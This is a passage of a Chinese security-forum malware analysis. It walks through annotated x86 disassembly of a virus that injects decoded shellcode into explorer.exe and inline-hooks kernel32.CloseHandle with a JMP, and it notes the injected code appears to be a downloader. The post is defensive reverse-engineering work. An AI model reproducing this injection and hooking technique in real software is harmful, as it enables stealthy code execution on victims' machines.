
# 病毒注入与 Inline Hook 分析

```
00C5C649    FF10                    call    dword ptr [eax]                                 ; ReadProcessMemory

00C5C64B    85C0                    test    eax, eax

00C5C64D    0F84 F3000000           je      00C5C746

00C5C653    8B45 D6                 mov     eax, dword ptr [ebp-2A]

00C5C656    3D 8BFF558B             cmp     eax, 8B55FF8B                                   ; 用特征值比对是否读取正确

00C5C65B    0F85 DE000000           jnz     00C5C73F

00C5C661    6A 40                   push    40

00C5C663    68 00100000             push    1000

00C5C668    68 14C80000             push    0C814

00C5C66D    6A 00                   push    0

00C5C66F    FF75 F8                 push    dword ptr [ebp-8]

00C5C672    E8 04000000             call    00C5C67B                                        ; 读取成功在explorer.exe中申请一块内存

00C5C677    E7 BD                   out     0BD, eax

00C5C679    0000                    add     byte ptr [eax], al

00C5C67B    58                      pop     eax

00C5C67C    2B00                    sub     eax, dword ptr [eax]

00C5C67E    FF10                    call    dword ptr [eax]

00C5C680    85C0                    test    eax, eax

00C5C682    0F84 BE000000           je      00C5C746

00C5C688    8945 F4                 mov     dword ptr [ebp-C], eax                          ; 保存内存地址

00C5C68B    8D45 D6                 lea     eax, dword ptr [ebp-2A]

00C5C68E    C600 E9                 mov     byte ptr [eax], 0E9

00C5C691    B9 F4C40000             mov     ecx, 0C4F4                                      ; 注入到explorer.exe部分shellcode开始执行地址偏移是个营编码值

00C5C696    034D F4                 add     ecx, dword ptr [ebp-C]                          ; 计算注入到explorer.exe后ShellCode开始执行的 内存地址

00C5C699    2B4D E4                 sub     ecx, dword ptr [ebp-1C]

00C5C69C    83E9 05                 sub     ecx, 5                                          ; 计算JMP指令的值(计算Hook点的代码)

00C5C69F    8948 01                 mov     dword ptr [eax+1], ecx

00C5C6A2    C745 EC 14C80000        mov     dword ptr [ebp-14], 0C814

00C5C6A9    C745 F0 00000000        mov     dword ptr [ebp-10], 0

00C5C6B0    C745 E8 00000000        mov     dword ptr [ebp-18], 0

00C5C6B7    837D EC 00              cmp     dword ptr [ebp-14], 0

00C5C6BB    74 42                   je      short 00C5C6FF

00C5C6BD    8D45 F0                 lea     eax, dword ptr [ebp-10]

00C5C6C0    50                      push    eax

00C5C6C1    FF75 EC                 push    dword ptr [ebp-14]

00C5C6C4    E8 04000000             call    00C5C6CD

00C5C6C9    BD C6000058             mov     ebp, 580000C6

00C5C6CE    2B00                    sub     eax, dword ptr [eax]

00C5C6D0    0345 E8                 add     eax, dword ptr [ebp-18]

00C5C6D3    50                      push    eax

00C5C6D4    8B45 F4                 mov     eax, dword ptr [ebp-C]

00C5C6D7    0345 E8                 add     eax, dword ptr [ebp-18]

00C5C6DA    50                      push    eax

00C5C6DB    FF75 F8                 push    dword ptr [ebp-8]

00C5C6DE    E8 04000000             call    00C5C6E7                                        ; 将timt.ini+0xc开始解码后的数据写入explorer.exe进程地址空间
```

将 Shellcode 写入目标进程后 病毒 Hook 的目标进程的 `kernel32.CloseHandle`。

具体代码如下：

```
0c0C5C719    FF10                    call    dword ptr [eax]                                 ; 修改CloseHandle处的内存读写属性

00C5C71B    85C0                    test    eax, eax

00C5C71D    74 27                   je      short 00C5C746

00C5C71F    6A 00                   push    0

00C5C721    6A 05                   push    5

00C5C723    8D45 D6                 lea     eax, dword ptr [ebp-2A]

00C5C726    50                      push    eax

00C5C727    FF75 E4                 push    dword ptr [ebp-1C]

00C5C72A    FF75 F8                 push    dword ptr [ebp-8]

00C5C72D    E8 04000000             call    00C5C736                                        ; 用上一步骤计算好的JMP指令替换CloseHandle的前5字节
```

经过上面 ShellCode 代码注入和对 `CloseHandle` 的 inlineHook 病毒代码已经可以在 `explorer.exe` 执行过程中或得执行的权利 ,

经过 inlinehook 和恶意代码注入两个步骤 `explorer.exe` 地址空间内发生了如下图所示的变化

## Hook 前

![](https://bbs.kanxue.com/upload/attach/201105/297588_qw4m7tansu9yk5i.jpg)

## Hook 后

![](https://bbs.kanxue.com/upload/attach/201105/297588_iboqib9aljn8iw7.jpg)

如果 `explorer.exe` 调用 `CloseHandle` 这个 API 的话如下所示的恶意代码将获得执行的机会 貌似是个下载者,这里不做为重点分析

被写入的恶意 shellcode

![](https://bbs.kanxue.com/upload/attach/201105/297588_hfs5fvm362dgg55.jpg)

![](https://bbs.kanxue.com/view/img/face/41.gif) 搞完收工![](https://bbs.kanxue.com/view/img/face/27.gif)

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)

上传的附件：

- [雪花坏事代码.jpg](javascript:void(0);)

  （37.32kb，1177次下载）

- [原始.jpg](javascript:void(0);)

  （76.72kb，1179次下载）

- [雪花Hook.jpg](javascript:void(0);)

  （77.48kb，1172次下载）

- [shellcode整体1.gif](javascript:void(0);)

  （18.52kb，1171次下载）

- [解码整体1.gif](javascript:void(0);)

  （7.78kb，1172次下载）

- [整体1.gif](javascript:void(0);)

  （4.23kb，1170次下载）
